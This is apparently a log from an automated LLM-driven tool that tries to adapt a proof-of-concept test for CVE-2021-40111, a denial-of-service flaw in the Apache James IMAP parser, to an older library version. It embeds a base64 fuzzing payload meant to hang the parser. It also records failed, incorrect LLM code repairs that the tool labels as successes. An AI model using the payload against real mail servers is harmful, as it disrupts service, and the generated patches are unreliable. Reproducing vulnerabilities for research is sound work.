[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[15,41] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.api.message[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class Tag'}
[RepairModule] New grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class Tag'}
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #(286, 310) at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[15,41] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.api.message[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1938 (prompt), 1 (completion), 1939 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[15,41] cannot find symbol
  symbol:   class Tag
  location: package org.apache.james.imap.api.message
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[INFO] 4 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.366 s
[INFO] Finished at: 2025-07-13T15:35:22Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[15,41] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: package org.apache.james.imap.api.message
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 138 (prompt), 11 (completion), 149 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class Tag, package org.apache.james.imap.api.message 

The test executes as expected in 3.5.0 

Error code: import org.apache.james.imap.api.message.Tag; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.api.message.Tag;Tag
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.api.message.Tag', 'Tag'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 15, 'column': 41, 'message': 'cannot find symbol', 'symbol': 'class Tag', 'location': 'package org.apache.james.imap.api.message', 'code_line': 'import org.apache.james.imap.api.message.Tag;'} with cause: ['org.apache.james.imap.api.message.Tag', 'Tag'][0m
[LLMClient] Tokens used: 166 (prompt), 11 (completion), 177 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class Tag, package org.apache.james.imap.api.message 

The test executes as expected in 3.5.0 

Error code: import org.apache.james.imap.api.message.Tag; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['org.apache.james.imap.api.message.Tag', 'Tag'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.api.message.Tag;Tag
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.api.message.Tag', 'Tag'][0m
[96m[Adapter] Related diffs for error: [(270, 5.0), (286, 5.0), (301, 5.0), (310, 5.0), (1234, 5.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class Tag cause: ['org.apache.james.imap.api.message.Tag', 'Tag'][0m
[96m[RepairModule] Trying best diff #270 with score 5.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #(301, 1234) with score 5.00[0m
[LLMClient] Tokens used: 2158 (prompt), 496 (completion), 2654 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class Tag, location: package org.apache.james.imap.api.message

### Error Position:
import org.apache.james.imap.api.message.Tag;

### Related Diff:
Operation: DELETED_FILE, File: backends-common/rabbitmq/src/test/java/org/apache/james/backends/rabbitmq/RabbitMQTest.java, Hunk: @@ -0,0 +1,560 @@
-/****************************************************************
- * Licensed to the Apache Software Foundation (ASF) under one   *
- * or more contributor license agreements.  See the NOTICE file *
- * distributed with this work for additional information        *
- * regarding copyright ownership.  The ASF licenses this file   *
- * to you under the Apache License, Version 2.0 (the            *
- * "License"); you may not use this file except in compliance   *
- * with the License.  You may obtain a copy of the License at   *
- *                                                              *
- *   http://www.apache.org/licenses/LICENSE-2.0                 *
- *                                                              *
- * Unless required by applicable law or agreed to in writing,   *
- * software distributed under the License is distributed on an  *
- * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY       *
- * KIND, either express or implied.  See the License for the    *
- * specific language governing permissions and limitations      *
- * under the License.                                           *
- ****************************************************************/
-package org.apache.james.backends.rabbitmq;
-
-import static com.rabbitmq.client.MessageProperties.PERSISTENT_TEXT_PLAIN;
-import static org.apache.james.backends.rabbitmq.Constants.AUTO_ACK;
-import static org.apache.james.backends.rabbitmq.Constants.AUTO_DELETE;
-import static org.apache.james.backends.rabbitmq.Constants.DIRECT_EXCHANGE;
-import static org.apache.james.backends.rabbitmq.Constants.DURABLE;
-import static org.apache.james.backends.rabbitmq.Constants.EXCLUSIVE;
-import static org.apache.james.backends.rabbitmq.Constants.MULTIPLE;
-import static org.apache.james.backends.rabbitmq.Constants.NO_LOCAL;
-import static org.apache.james.backends.rabbitmq.Constants.NO_PROPERTIES;
-import static org.apache.james.backends.rabbitmq.Constants.REQUEUE;
-import static org.apache.james.backends.rabbitmq.RabbitMQFixture.EXCHANGE_NAME;
-import static org.apache.james.backends.rabbitmq.RabbitMQFixture.ROUTING_KEY;
-import static org.apache.james.backends.rabbitmq.RabbitMQFixture.WORK_QUEUE;
-import static org.apache.james.backends.rabbitmq.RabbitMQFixture.awaitAtMostOneMinute;
-import static org.assertj.core.api.Assertions.assertThat;
-import static org.assertj.core.api.Assertions.assertThatThrownBy;
-
-import java.io.IOException;
-import java.nio.charset.StandardCharsets;
-import java.util.Arrays;
-import java.util.List;
-import java.util.Queue;
-import java.util.UUID;
-import java.util.concurrent.ConcurrentLinkedQueue;
-import java.util.concurrent.TimeUnit;
-import java.util.concurrent.TimeoutException;
-import java.util.concurrent.atomic.AtomicInteger;
-import java.util.stream.Collectors;
-import java.util.stream.IntStream;
-
-import org.junit.jupiter.api.AfterEach;
-import org.junit.jupiter.api.BeforeEach;
-import org.junit.jupiter.api.Nested;
-import org.junit.jupiter.api.Test;
-import org.junit.jupiter.api.extension.RegisterExtension;
-
-import com.github.fge.lambdas.Throwing;
-import com.github.steveash.guavate.Guavate;
-import com.google.common.collect.ImmutableList;
-import com.google.common.collect.ImmutableMap;
-import com.google.common.collect.Iterables;
-import com.rabbitmq.client.AMQP;
-import com.rabbitmq.client.CancelCallback;
-import com.rabbitmq.client.Channel;
-import com.rabbitmq.client.Connection;
-import com.rabbitmq.client.ConnectionFactory;
-import com.rabbitmq.client.DeliverCallback;
-import com.rabbitmq.client.Delivery;
-
-class RabbitMQTest {
-
-    public static final ImmutableMap<String, Object> NO_QUEUE_DECLARE_ARGUMENTS = ImmutableMap.of();
-    @RegisterExtension
-    static RabbitMQExtension rabbitMQExtension = RabbitMQExtension.singletonRabbitMQ();
-
-    @Nested
-    class SingleConsumerTest {
-
-        private ConnectionFactory connectionFactory;
-        private Connection connection;
-        private Channel channel;
-
-        @BeforeEach
-        void setup(DockerRabbitMQ rabbitMQ) throws IOException, TimeoutException {
-            connectionFactory = rabbitMQ.connectionFactory();
-            connectionFactory.setNetworkRecoveryInterval(1000);
-            connection = connectionFactory.newConnection();
-            channel = connection.createChannel();
-        }
-
-        @AfterEach
-        void tearDown(DockerRabbitMQ rabbitMQ) throws Exception {
-            closeQuietly(connection, channel);
-            rabbitMQ.reset();
-        }
-
-        @Test
-        void publishedEventWithoutSubscriberShouldNotBeLost() throws Exception {
-            String queueName = createQueue(channel);
-            publishAMessage(channel);
Operation: MODIFIED, File: mailbox/api/src/test/java/org/apache/james/mailbox/RoleTest.java, Hunk: @@ -23,28 +23,28 @@
 import java.util.Locale;
 import java.util.Optional;

+import org.junit.Test;
-import org.junit.jupiter.api.Test;

+public class RoleTest {
-class RoleTest {

     @Test
+    public void fromShouldReturnEmptyWhenUnknownValue() {
-    void fromShouldReturnEmptyWhenUnknownValue() {
         assertThat(Role.from("jjjj")).isEqualTo(Optional.empty());
     }

     @Test
+    public void fromShouldReturnSomethingWhenXPrefixedRole() {
-    void fromShouldReturnSomethingWhenXPrefixedRole() {
         assertThat(Role.from("x-client-specific-role")).isEqualTo(Optional.of(new Role("x-client-specific-role")));
     }

     @Test
+    public void isSystemRoleShouldReturnFalseWhenXPrefixedRole() {
-    void isSystemRoleShouldReturnFalseWhenXPrefixedRole() {
         Role role = Role.from("x-client-specific-role").get();
         assertThat(role.isSystemRole()).isFalse();
     }

     @Test
+    public void fromShouldReturnInboxWhenContainsUppercaseValueInTurkish() {
-    void fromShouldReturnInboxWhenContainsUppercaseValueInTurkish() {
         Locale previousLocale = Locale.getDefault();
         Locale.setDefault(Locale.forLanguageTag("tr"));
         try {

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.message.Tag;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file with the fix based on the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.message.request.ImapRequest;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, ImapRequest tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,82] incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[37,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[41,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'cannot find symbol | class Tag'}
[RepairModule] New grouped keys: {'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |', 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |', 'incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest |'}
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 41, Column: 14
  Message  : method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,org.apache.james.imap.api.message.request.ImapRequest,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length
  Symbol   : None
  Location : None
  Code     : super.decode(request, tag, session);
  Position : after the fixing line (15)[0m
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 30, Column: 82
  Message  : incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest
  Symbol   : None
  Location : None
  Code     : new ByteArrayOutputStream()), ImapCommand.anyStateCommand("AEA"), new FakeImapSession()))
  Position : after the fixing line (15)[0m
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #(301, 1234) at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,82] incompatible types: org.apache.james.imap.api.ImapCommand cannot be converted to org.apache.james.imap.api.message.request.ImapRequest[0m
